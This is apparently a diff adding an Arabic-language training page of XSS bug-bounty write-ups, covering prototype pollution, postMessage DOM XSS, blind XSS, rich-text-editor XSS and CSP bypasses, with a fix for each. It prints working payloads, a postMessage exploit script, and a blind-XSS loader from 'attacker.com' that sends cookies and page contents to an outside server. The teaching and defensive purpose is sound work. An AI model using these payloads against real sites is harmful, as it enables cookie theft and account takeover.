+      <div class="wu-step ar"><strong>خطوة 3:</strong> دور على script gadget في نفس الـ JS file. وجد <code>$.each</code> loop بتـ iterate على <code>this._userServerConfiguration.install.hooks</code> وبتـ eval الـ properties.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> بنى payload URL يلوث الـ prototype بحيث الـ hooks property تحتوي على alert.</div>
+      <div class="wu-step"><strong>Final URL:</strong><br/>https://blog.swiftype.com/#__proto__[asd]=alert(document.domain)<br/><span style="color:var(--green)">// بمجرد فتح الـ URL ينفذ الـ alert بدون أي تفاعل!</span></div>
+      <p><strong>الإصلاح:</strong> تحديث مكتبة SwiftType Search، استبدال <code>deparam</code> بـ URLSearchParams، وإضافة فحص للـ __proto__ في أي JSON parsing.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://hackerone.com/reports/998398" target="_blank">HackerOne Report #998398 →</a>
+      <span class="tag t-purple">DOM XSS</span>
+      <span class="tag t-gray">URL Hash Pollution</span>
+      <span class="tag t-amber">154 upvotes</span>
+    </div>
+  </div>
+
+  <div class="alert alert-purple" style="background:rgba(168,85,247,.07);border-color:var(--purple);color:var(--text2)">
+    <strong>🔍 للتيم — كيف تفحص:</strong> في أي موقع، افتح الـ Network tab وشوف كل الـ JS libraries المحملة. لو في أي مكتبة بتـ parse URL parameters أو بتعمل deep merge لـ objects، جرب <code>?__proto__[test]=xss</code> وافحص في الـ console <code>Object.prototype.test</code>. لو رجع القيمة — الـ Prototype Pollution شغال.
+  </div>
+</div>
+
+<!-- postMessage -->
+<div class="section" id="wu-postmsg">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--blue)"></span>
+    <span class="sec-title">DOM XSS via postMessage</span>
+    <span class="sec-en">Cross-Window Messaging Abuse Writeups</span>
+    <span class="sec-badge">متكرر في Modern Apps</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">الفكرة ببساطة</div>
+    <div class="card-body">
+      <p>الـ <code>postMessage</code> API بتسمح للـ windows والـ iframes يتواصلوا مع بعض. المشكلة لما الكود بيـ listen لـ messages ومش بيتحقق من <code>event.origin</code> — أي صفحة تانية تقدر تبعت message وتتحكم في الـ DOM. الأخطر إن الـ third-party widgets زي Marketo forms، payment SDKs، وanalytics libraries كتير منها بتستخدم postMessage ومش دايماً بتعمل origin validation صح.</p>
+    </div>
+  </div>
+
+  <!-- HackerOne postMessage writeup -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🔵</div>
+      <div class="wu-info">
+        <div class="wu-title">DOM XSS في HackerOne.com نفسها via Marketo postMessage</div>
+        <div class="wu-sub">HackerOne Report #398054 · $500 Bounty · 204 upvotes · أحد أشهر الـ reports</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> موقع hackerone.com كان بيستخدم Marketo contact form widget — ده widget بيتحط كـ third-party JavaScript.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> فتح صفحة الـ contact في hackerone.com وعمل inspect للـ page source. لاحظ Marketo form script محمل.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> فتح الـ JS console وبحث عن <code>addEventListener('message'</code> في الـ scripts — وجد listener فيه.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> راجع الكود — الـ listener بيستقبل الـ message ولو فيه <code>mktoResponse</code> بيستدعي <code>findCorrectFollowUpUrl()</code> بعدين بيعمل <code>window.location = url</code>.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> مفيش فحص لـ <code>event.origin</code> — أي صفحة تقدر تبعت message.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> بنى صفحة exploit تفتح hackerone.com في popup ثم تبعتله message بـ javascript: URL:</div>
+      <div class="wu-step"><strong>Exploit Code:</strong><br/>var w = window.open('https://hackerone.com/contact');<br/>setTimeout(function() {<br/>  w.postMessage(JSON.stringify({<br/>    mktoResponse: { followUpUrl: 'javascript:alert(document.domain)' }<br/>  }), '*');<br/>}, 2000);</div>
+      <p><strong>الإصلاح الأول كان خاطئ:</strong> HackerOne أضافوا فحص بـ indexOf — لكن <code>indexOf</code> مش safe! إذا المهاجم سجّل domain اسمه <code>app-sj17.ma</code> (نفس بداية الـ Marketo domain) كان يقدر يـ bypass.</p>
+      <div class="wu-step"><strong>الإصلاح الصح:</strong><br/><span style="color:var(--red)">// خطأ — indexOf قابل للـ bypass</span><br/>if (trustedOrigin.indexOf(event.origin) === 0) { ... }<br/><br/><span style="color:var(--green)">// صح — strict equality</span><br/>if (event.origin === 'https://app-sj17.marketo.com') { ... }</div>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://hackerone.com/reports/398054" target="_blank">HackerOne Report #398054 →</a>
+      <a class="wu-link" href="https://jlajara.gitlab.io/Dom_XSS_PostMessage_2" target="_blank">PostMessage Vulnerabilities Analysis →</a>
+      <span class="tag t-blue">DOM XSS</span>
+      <span class="tag t-blue">postMessage</span>
+      <span class="tag t-green">$500 Bounty</span>
+      <span class="tag t-amber">204 upvotes</span>
+    </div>
+  </div>
+
+  <!-- Shopify postMessage -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🔵</div>
+      <div class="wu-info">
+        <div class="wu-title">Shopify — DOM XSS via postMessage + HTML5 Structured Clone Algorithm</div>
+        <div class="wu-sub">HackerOne Report #231053 · $3,000 · 101 upvotes · كل Shopify stores متأثرة</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> صفحة <code>/:id/digital_wallets/dialog</code> في Shopify كانت فيها postMessage listener.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> دور على كل الـ JavaScript في Shopify checkout pages. وجد listener على <code>message</code> events.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> الكود الأصلي كان بيحاول يعمل escaping للـ input قبل ما يحطه في الـ DOM — لكن الـ escaping كان خاطئ.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> اكتشف إن HTML5 Structured Clone Algorithm (اللي بيستخدمه postMessage لنقل البيانات) بيتعامل مع بعض الـ objects بشكل خاص بيـ bypass الـ escaping.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> بنى exploit يبعت message من أي domain للـ Shopify page بيستخدم الـ algorithm bypass.</div>
+      <p><strong>الإصلاح:</strong> Shopify عملوا strict origin validation وصلحوا الـ escaping logic.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://hackerone.com/reports/231053" target="_blank">HackerOne Report #231053 →</a>
+      <span class="tag t-blue">Stored/DOM XSS</span>
+      <span class="tag t-green">$3,000</span>
+      <span class="tag t-gray">HTML5 Clone Algorithm</span>
+    </div>
+  </div>
+
+  <div class="alert alert-blue">
+    <strong>🔍 للتيم — كيف تفحص:</strong> في الـ DevTools، اكتب في الـ console:
+    <div class="code" style="margin:.5rem 0">
+// دور على كل الـ message event listeners في الصفحة
+getEventListeners(window).message
+// أو ابحث في الكود
+document.querySelectorAll('script').forEach(s => {
+  if(s.textContent.includes('addEventListener') &amp;&amp; 
+     s.textContent.includes('message')) console.log('FOUND:', s.src || 'inline')
+})</div>
+    ثم افحص كل listener — هل فيه <code>if (event.origin !== 'https://exact-domain.com') return;</code> بـ strict equality؟ لو لأ أو في <code>indexOf</code> أو <code>includes</code> — ده vulnerable.
+  </div>
+</div>
+
+<!-- BLIND XSS -->
+<div class="section" id="wu-blind">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--teal)"></span>
+    <span class="sec-title">Blind XSS — الثغرة اللي بتتأخر</span>
+    <span class="sec-en">Out-of-Band XSS Writeups</span>
+    <span class="sec-badge">33% من XSS في Bug Bounty 2025</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">ليه Blind XSS بقى الأعلى أجراً في 2025؟</div>
+    <div class="card-body">
+      <p>الـ Blind XSS بيشتغل لما الـ payload بيتخزن في جهة (زي feedback form أو user profile) لكن بيتنفذ في جهة تانية (زي admin dashboard أو support system) من غير ما المهاجم يشوف الـ execution مباشرة. ده خطير لأنه بيتنفذ في <strong>high-privilege context</strong> — يعني ممكن يوصل لبيانات الـ admin أو لـ internal systems مش متاحة من الخارج. في 2025، Bugcrowd وثّق bounties تجاوزت $250,000 من Blind XSS في admin panels.</p>
+    </div>
+    <div class="src"><a href="https://www.bugcrowd.com/blog/the-guide-to-blind-xss-advanced-techniques-for-bug-bounty-hunters-worth-250000/" target="_blank">Bugcrowd — Blind XSS Guide ($250K+) · October 2025</a></div>
+  </div>
+
+  <!-- UK Ministry of Defence -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟢</div>
+      <div class="wu-info">
+        <div class="wu-title">UK Ministry of Defence — Stored XSS via Government Forms</div>
+        <div class="wu-sub">Bug Bounty Report · حكومي حساس جداً · خطوات من البداية</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> موقع تابع لـ UK Ministry of Defence فيه input forms.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> استخدم Google Dorking لإيجاد صفحات مع input forms تحت <code>site:.mod.uk inurl:form OR inurl:submit OR inurl:contact</code></div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> وجد عدة forms — بدأ باختبار كل field بـ simple probe: <code>&lt;u&gt;testmyinput&lt;/u&gt;</code> وفحص الـ page source لو الـ tag ظهر.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> في حقل معين، الـ tag ظهر في الـ source من غير escaping — ده يعني الـ HTML injection ممكن.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> جرب payload بسيط <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> — ما اشتغلش (الـ script tags مفلترة).</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> جرب SVG payload: <code>&lt;svg onload=alert(1)&gt;</code> — اشتغل! الـ SVG مش محفوظ في الـ filter.</div>
+      <div class="wu-step ar"><strong>خطوة 6:</strong> بما إن الـ form data بتتعرض على موظفين داخليين، حط Blind XSS payload بدل <code>alert</code> بيبعت الـ cookies والـ screenshot لـ server خارجي.</div>
+      <p><strong>النتيجة:</strong> الـ payload اتنفذ في بيئة حكومية داخلية وبعت بيانات الـ session. تم الإبلاغ فوراً.</p>
+      <p><strong>الإصلاح:</strong> تطبيق HTMLPurifier على الـ server side، وإضافة CSP header صارم.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://medium.com/@sagarjondhle/how-i-found-and-reported-a-critical-stored-xss-vulnerability-in-the-uk-ministry-of-defence-a-bug-e44497befaa8" target="_blank">Medium Writeup →</a>
+      <span class="tag t-teal">Blind XSS</span>
+      <span class="tag t-red">Government Target</span>
+      <span class="tag t-gray">SVG Bypass</span>
+    </div>
+  </div>
+
+  <!-- Zomato Admin -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟢</div>
+      <div class="wu-info">
+        <div class="wu-title">Zomato — Blind XSS في Admin Dashboard via Username Field</div>
+        <div class="wu-sub">HackerOne Report · $500 · 92 upvotes · نموذج كلاسيكي للـ Blind XSS</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> حقل الاسم عند التسجيل في Zomato — البيانات دي بتظهر لاحقاً في admin panel.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> سجّل account جديد في Zomato وحط Blind XSS payload في حقل "الاسم" بدل الاسم الحقيقي.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> الـ payload كان يبعت الـ cookies والـ URL الحالي لـ server خارجي يتحكم فيه الباحث (XSS Hunter أو Burp Collaborator).</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> انتظر — بعد ساعات، وصل notification للـ server الخارجي بيقول الـ payload اتنفذ.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> الـ payload نفّذ في admin dashboard الخاص بـ Zomato — يعني admin فتح صفحة الـ users وشاف اسم الـ user اللي هو الـ payload.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> الـ server الخارجي استقبل الـ admin cookies والـ screenshot للـ admin dashboard الداخلي.</div>
+      <div class="wu-step"><strong>Blind XSS Payload المستخدم:</strong><br/>"&gt;&lt;script src="https://attacker.com/blind.js"&gt;&lt;/script&gt;<br/><span style="color:var(--text3)">// blind.js بيبعت: document.cookie, location.href, document.body.innerHTML</span></div>
+      <p><strong>الإصلاح:</strong> تطبيق output encoding على كل بيانات اليوزر في الـ admin panel، وإضافة HttpOnly على الـ admin cookies.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md" target="_blank">HackerOne Top XSS Reports →</a>
+      <span class="tag t-teal">Blind XSS</span>
+      <span class="tag t-red">Admin Panel Hit</span>
+      <span class="tag t-green">$500</span>
+    </div>
+  </div>
+
+  <!-- CVE-2025-4123 Grafana chain -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟢</div>
+      <div class="wu-info">
+        <div class="wu-title">CVE-2025-4123 — Grafana: Open Redirect → Stored XSS → SSRF (Full Read)</div>
+        <div class="wu-sub">US Dept of Defense Bug Bounty · 2025 · نموذج Attack Chain كامل</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> instance من Grafana مرفوع على server يتبع US Dept of Defense.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> اكتشف Open Redirect في Grafana — parameter بيـ redirect اليوزر لـ URL خارجي من غير validation.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> استخدم الـ Open Redirect لتوجيه اليوزر لصفحة تحتوي على malicious HTML يستغل Stored XSS في Grafana نفسها.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> الـ Stored XSS اتنفذ في context الـ authenticated user — الـ XSS بيشتغل على الـ Grafana server.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> من داخل الـ XSS، عمل SSRF requests لـ internal endpoints اللي مش متاحة من الخارج — وصل لبيانات داخلية حساسة.</div>
+      <p><strong>الإصلاح:</strong> Grafana أصلح الـ Open Redirect والـ Stored XSS في نفس الـ patch.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://github.com/reddelexc/hackerone-reports/blob/master/tops_by_bug_type/TOPXSS.md" target="_blank">HackerOne Reports →</a>
+      <span class="tag t-teal">Attack Chain</span>
+      <span class="tag t-red">CVE-2025-4123</span>
+      <span class="tag t-blue">XSS → SSRF</span>
+    </div>
+  </div>
+
+  <div class="card">
+    <div class="card-title">أين تحط الـ Blind XSS Payloads؟ — جدول شامل</div>
+    <div class="card-body">
+      <div class="tbl">
+        <table>
+          <tr><th>الحقل</th><th>ليه؟</th><th>أين بيظهر للـ Admin؟</th><th>أولوية الاختبار</th></tr>
+          <tr><td>الاسم الأول / الأخير</td><td>بيظهر في user management pages</td><td>Admin dashboard → Users list</td><td style="color:var(--red)">عالية جداً</td></tr>
+          <tr><td>Company / Organization name</td><td>بيظهر في reports وinvoices</td><td>Billing systems, CRM</td><td style="color:var(--red)">عالية جداً</td></tr>
+          <tr><td>Support ticket / Feedback</td><td>موظف الـ support بيقرأه</td><td>Support dashboard / Zendesk</td><td style="color:var(--red)">عالية جداً</td></tr>
+          <tr><td>User-Agent Header</td><td>بيتلوج في الـ server logs</td><td>Log viewers, SIEM tools</td><td style="color:var(--amber)">عالية</td></tr>
+          <tr><td>Referer Header</td><td>نفس User-Agent</td><td>Analytics, log management</td><td style="color:var(--amber)">عالية</td></tr>
+          <tr><td>Profile Bio / Description</td><td>بيتعرض للـ admin في user profile viewer</td><td>CMS, social platforms admin</td><td style="color:var(--amber)">عالية</td></tr>
+          <tr><td>Address / City / Country</td><td>بيتطبع في PDFs أو invoices</td><td>ERP, billing, order management</td><td style="color:var(--amber)">متوسطة</td></tr>
+          <tr><td>Search queries (محفوظة)</td><td>بتظهر في "recent searches" للـ admin</td><td>Search analytics dashboards</td><td style="color:var(--amber)">متوسطة</td></tr>
+          <tr><td>Error messages / Exception reports</td><td>بتظهر في Error tracking tools</td><td>Sentry, Rollbar, custom dashboards</td><td style="color:var(--green)">متوسطة</td></tr>
+          <tr><td>File names (uploads)</td><td>بيظهر في file manager للـ admin</td><td>Media library, file management</td><td style="color:var(--green)">منخفضة</td></tr>
+        </table>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- RICH TEXT EDITORS -->
+<div class="section" id="wu-rte">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--orange)"></span>
+    <span class="sec-title">XSS في Rich Text Editors</span>
+    <span class="sec-en">WYSIWYG Editor Vulnerabilities</span>
+    <span class="sec-badge">active في 2025 مع كل editor</span>
+  </div>
+
+  <!-- Trix Editor -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟠</div>
+      <div class="wu-info">
+        <div class="wu-title">Trix Editor v2.1.1 — Stored XSS via Copy-Paste ($1,000 Bounty)</div>
+        <div class="wu-sub">Basecamp Bug Bounty · يوليو 2025 · Bypass لـ CVE-2024-34341 patch</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> أي تطبيق بيستخدم Trix Editor للـ rich text editing — بيشمل Basecamp وأي framework بيضمنه.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> الباحث كان يراجع الـ CVEs الأخيرة لـ Trix Editor ووجد CVE-2024-34341 اللي كانت بتسمح XSS via <code>data-trix-attachment</code>. راجع الـ patch وقرر يحاول يـ bypass.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> لاحظ إن الـ patch صلح الـ direct injection لكن ما صلحش الـ copy-paste path — لما اليوزر بيعمل copy لـ HTML من browser ويعمل paste في Trix، الـ editor بيقرأ الـ HTML تاني.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> جهّز HTML page فيها XSS payload مخفي في <code>data-trix-attachment</code> attribute:</div>
+      <div class="wu-step"><strong>Crafted HTML for Copy:</strong><br/>&lt;figure data-trix-attachment='{"contentType":"image","url":"x","width":100,"height":100}'<br/>  data-trix-attributes='{"presentation":"gallery"}'<br/>  &lt;img src="x" onerror="alert('XSS')" width="100" height="100"&gt;<br/>&lt;/figure&gt;</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> عمل Ctrl+C على الـ HTML ده في المتصفح، فتح تطبيق Basecamp، عمل Ctrl+V في الـ Trix editor.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> الـ payload اتنفذ عند الـ paste! الـ editor ما كانش بيـ sanitize الـ pasted HTML من الـ clipboard بنفس طريقة sanitize الـ direct input.</div>
+      <p><strong>الإصلاح:</strong> تحديث لـ Trix مع sanitization صارم لـ paste events بنفس مستوى الـ direct input، ومنع الـ event handlers في الـ attachment attributes.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://medium.com/h7w/1-000-bounty-stored-xss-in-trix-editor-v2-1-1-via-malicious-paste-payload-4fa413fcde28" target="_blank">Medium Writeup →</a>
+      <span class="tag t-orange">Stored XSS</span>
+      <span class="tag t-amber">Patch Bypass</span>
+      <span class="tag t-green">$1,000</span>
+    </div>
+  </div>
+
+  <!-- Apple Discussions -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟠</div>
+      <div class="wu-info">
+        <div class="wu-title">Apple Developer Forums — Stored XSS + Multi-Domain Bypass ($5,000)</div>
+        <div class="wu-sub">Apple Security Bounty · مارس 2025 → يوليو 2025 · Youssef Desouki (Zombie Hack)</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> منتديات Apple على discussions.apple.com وdeveloper.apple.com/forums — بيسمحوا بالتعليق والمناقشة.</p>
+      <p><strong>الـ Timeline الكامل:</strong></p>
+      <div class="wu-step ar"><strong>31 مارس 2025 — الاكتشاف الأول:</strong> وجد Stored XSS في discussions.apple.com في حقل معين في التعليقات. جرب payloads مختلفة وبدأ بـ HTML injection بسيطة: <code>&lt;b&gt;test&lt;/b&gt;</code> — ظهرت bold في الصفحة.</div>
+      <div class="wu-step ar"><strong>بعدها:</strong> جرب SVG payload: <code>&lt;svg onload=alert(1)&gt;</code> — نجح! Apple كانت بتفلتر script tags لكن ما كانتش بتفلتر SVG events.</div>
+      <div class="wu-step ar"><strong>5 أبريل 2025 — Apple تأكد الثغرة:</strong> Apple قالوا إنهم بيشتغلوا على patch.</div>
+      <div class="wu-step ar"><strong>8 أبريل 2025 — Bypass الـ Patch:</strong> بعد ما Apple عملوا partial fix، الباحث جرب نفس الـ payload على مواقع Apple الأخرى بنفس الـ backend (discussions-jp-prz.apple.com، discussionschinese.apple.com، communities.apple.com، developer.apple.com/forums).</div>
+      <div class="wu-step ar"><strong>اكتشف إن الـ Fix مش مطبق على كل الـ mirrors:</strong> developer.apple.com/forums كانت لسه vulnerable! وده أخطر لأنه موقع للـ developers ومرتاد من technical users.</div>
+      <div class="wu-step ar"><strong>13 مايو 2025 — Apple يعمل Full Fix:</strong> بعد تحقيق شامل، Apple عملوا system-wide fix على كل الـ assets المتأثرة.</div>
+      <div class="wu-step ar"><strong>31 يوليو 2025 — المكافأة:</strong> $5,000 Apple Security Bounty.</div>
+      <p><strong>الدرس المهم:</strong> لما بتلاقي ثغرة في domain، فحص كل الـ subdomains والـ mirrors اللي بتستخدم نفس الـ backend. الـ patch مش دايماً بيتطبق على كل الـ instances.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://medium.com/@ZombieHack/apple-developer-stored-xss-5-000-bounty-writeup-2025-cc34a030a5bf" target="_blank">Medium Writeup (Youssef Desouki) →</a>
+      <span class="tag t-orange">Stored XSS</span>
+      <span class="tag t-red">Multi-Domain</span>
+      <span class="tag t-green">$5,000</span>
+      <span class="tag t-amber">Patch Bypass</span>
+    </div>
+  </div>
+
+  <div class="alert alert-amber">
+    <strong>🔍 للتيم — كيف تفحص الـ Rich Text Editors:</strong><br/>
+    1. فحص الـ direct input — جرب <code>&lt;svg onload=alert(1)&gt;</code> مباشرة.<br/>
+    2. فحص الـ copy-paste — عمل HTML page فيها payload، Ctrl+C ثم Ctrl+V في الـ editor.<br/>
+    3. فحص الـ "Source view" — بعض الـ editors عندهم زرار لعرض HTML source وتعديله مباشرة.<br/>
+    4. فحص الـ image/link insertion — إضافة صورة بـ URL فيها <code>onerror</code>.<br/>
+    5. فحص الـ draft/autosave — بعض الثغرات بتتفعل بس في الـ preview مش في الـ saved version.
+  </div>
+</div>
+
+<!-- SPA / DOM -->
+<div class="section" id="wu-spa">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--green)"></span>
+    <span class="sec-title">SPA / DOM-Based XSS الجديد</span>
+    <span class="sec-en">Modern Framework XSS</span>
+  </div>
+
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟢</div>
+      <div class="wu-info">
+        <div class="wu-title">E-Commerce Search Bar — Stored XSS بعد فشل المحاولات الأولى ($2,000)</div>
+        <div class="wu-sub">Bug Bounty · أبريل 2025 · نموذج persistence وطريقة التفكير</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> موقع e-commerce كبير فيه search bar في الأعلى.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> لاحظ إن الـ search bar ما بيـ sanitize بشكل واضح — جرب كتابة <code>&lt;&gt;</code> والصفحة ما اتكسرتش. ده مؤشر محتمل.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> جرب الـ payload الكلاسيكي: <code>&lt;script&gt;alert(1)&lt;/script&gt;</code> — ما اشتغلش. الـ script tags مفلترة.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> جرب img tag: <code>&lt;img src=x onerror=alert(1)&gt;</code> — ما اشتغلش. الـ onerror attribute مفلترة.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> فتح الـ page source وبحث عن الـ input — وجد إن الـ search query بتظهر في metadata tags زي <code>&lt;meta name="description" content="Search results for: USER_INPUT"&gt;</code></div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> ده context مختلف! الـ input بيظهر داخل attribute value. جرب الـ attribute breakout: <code>"&gt;&lt;svg onload=alert(1)&gt;</code></div>
+      <div class="wu-step ar"><strong>خطوة 6:</strong> اشتغل! الـ filter كان بيفحص الـ tag content بس مش الـ attribute injection. الـ double quote خرج من الـ meta tag وأنشأ SVG tag جديدة.</div>
+      <div class="wu-step ar"><strong>خطوة 7:</strong> بما إن الـ search queries محفوظة في "recently searched" section بيظهر للآدمن — الثغرة بقت Stored XSS.</div>
+      <p><strong>الدرس:</strong> دايماً فحص في فين بالظبط بيظهر الـ input في الـ page source — مش بس هل بيظهر. الـ context بيغير كل حاجة.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://theindiannetwork.medium.com/how-i-discovered-a-critical-store-xss-vulnerability-and-earned-a-7-000-bounty-my-struggle-38d67b6f8ec8" target="_blank">Medium Writeup →</a>
+      <span class="tag t-green">Context-Aware XSS</span>
+      <span class="tag t-amber">Attribute Breakout</span>
+      <span class="tag t-gray">Metadata Injection</span>
+    </div>
+  </div>
+
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🟢</div>
+      <div class="wu-info">
+        <div class="wu-title">XSS في ChatBot via Stored Input — E-Commerce Support</div>
+        <div class="wu-sub">HackerOne Private Program · الـ payload اتحط في الـ chat message</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> e-commerce platform فيها live chat support.</p>
+      <p><strong>خطوات الاكتشاف:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1:</strong> الباحث لاحظ إن الـ chat messages بتتـ render في الـ browser مع بعض HTML formatting — بعض الـ messages فيها bold أو links.</div>
+      <div class="wu-step ar"><strong>خطوة 2:</strong> جرب كتابة <code>&lt;b&gt;test&lt;/b&gt;</code> في الـ chat — ظهر bold في الـ UI! يعني الـ HTML rendering مفعّل.</div>
+      <div class="wu-step ar"><strong>خطوة 3:</strong> جرب XSS payload: <code>&lt;img src=x onerror=alert(1)&gt;</code> — اشتغل في الـ chat window بتاعه.</div>
+      <div class="wu-step ar"><strong>خطوة 4:</strong> بما إن الـ support agent شايف نفس الـ messages من الـ admin side — الـ payload بيتنفذ عنده هو كمان! ده Stored XSS بيضرب الـ support staff.</div>
+      <div class="wu-step ar"><strong>خطوة 5:</strong> حط Blind XSS payload بيبعت الـ admin cookies لـ server خارجي.</div>
+      <p><strong>الدرس:</strong> أي chat feature أو messaging system — الـ messages بيتعرضوا على طرفين، اليوزر والـ support. لازم الاتنين يكونوا protected.</p>
+    </div>
+    <div class="wu-footer">
+      <a class="wu-link" href="https://mehedishakeel.medium.com/cross-site-scripting-xss-my-fifth-finding-on-hackerone-b879c5b84736" target="_blank">Medium Writeup →</a>
+      <span class="tag t-green">Stored XSS</span>
+      <span class="tag t-teal">Chat Feature</span>
+      <span class="tag t-gray">Support Panel Hit</span>
+    </div>
+  </div>
+</div>
+
+<!-- CSP BYPASS -->
+<div class="section" id="wu-csp">
+  <div class="sec-hdr">
+    <span class="sec-dot" style="background:var(--pink)"></span>
+    <span class="sec-title">CSP Bypass Techniques الجديدة</span>
+    <span class="sec-en">Content Security Policy Evasion</span>
+    <span class="sec-badge">متطور في 2025</span>
+  </div>
+
+  <div class="card">
+    <div class="card-title">متى CSP لا تكفي؟</div>
+    <div class="card-body">
+      <p>الـ CSP هو آخر خط دفاع — لكن في 2025 اكتُشفت عدة طرق لتجاوزه. أهمها: الـ JSONP endpoints في domains موثوقة (Google, GitHub, YouTube)، والـ CDN files بـ gadgets معروفة (Angular على cdnjs)، وغلطة الـ report-only mode.</p>
+    </div>
+  </div>
+
+  <!-- Intigriti July 2025 challenge - mXSS + CSP bypass -->
+  <div class="writeup">
+    <div class="wu-header">
+      <div class="wu-icon">🩷</div>
+      <div class="wu-info">
+        <div class="wu-title">Intigriti XSS Challenge 0725 — mXSS + DOM Clobber + Socket.IO CSP Bypass</div>
+        <div class="wu-sub">Jorian Woltjer · يوليو 2025 · Challenge صعب جداً / few solves</div>
+      </div>
+    </div>
+    <div class="wu-body">
+      <p><strong>السيناريو:</strong> Chat application بـ CSP صارم: <code>script-src 'self'</code> — يعني بس scripts من نفس الـ server.</p>
+      <p><strong>خطوات الحل:</strong></p>
+      <div class="wu-step ar"><strong>خطوة 1 — Mutation XSS:</strong> وجد إن DOMPurify بيسمح بـ <code>id=</code> attributes للـ DOM clobbering. عن طريق nesting كتير من <code>&lt;table&gt;</code> elements (512+)، حصل "node flattening" خلى <code>&lt;iframe&gt;</code> تتحط في مكان مش متوقع في الـ DOM.</div>
+      <div class="wu-step ar"><strong>خطوة 2 — XSS Injection:</strong> بعد الـ mXSS، عدى الـ DOMPurify sanitizer وأنشأ XSS payload في الصفحة — لكن الـ CSP منع التنفيذ.</div>
+      <div class="wu-step ar"><strong>خطوة 3 — CSP Bypass via Socket.IO:</strong> لاحظ إن الـ Socket.IO endpoint <code>/chat/:uuid?transport=polling</code> بيرجع response فيها الـ chat messages كـ <code>text/plain</code> بدون <code>X-Content-Type-Options</code> header.</div>
